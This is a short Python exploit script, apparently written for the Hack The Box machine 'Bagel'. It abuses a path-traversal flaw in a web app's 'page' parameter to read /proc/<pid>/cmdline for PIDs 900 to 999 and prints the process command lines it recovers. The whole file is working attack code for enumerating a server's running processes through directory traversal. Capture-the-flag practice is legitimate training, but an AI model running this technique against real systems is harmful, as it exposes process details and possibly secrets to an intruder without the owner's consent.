#!/usr/bin/python3
from pwn import log
import requests

target = "http://bagel.htb:8000/"

bar = log.progress("Fuzzeando cmdline")

for pid in range(900,1000):
    bar.status(str(pid))
    params = {"page": f"../../../../proc/{pid}/cmdline"}
    request = requests.get(target, params=params)

    if request.text != "File not found" and request.text != "":
        log.info(f"{pid}: " + request.text.strip().replace("\x00", " "))
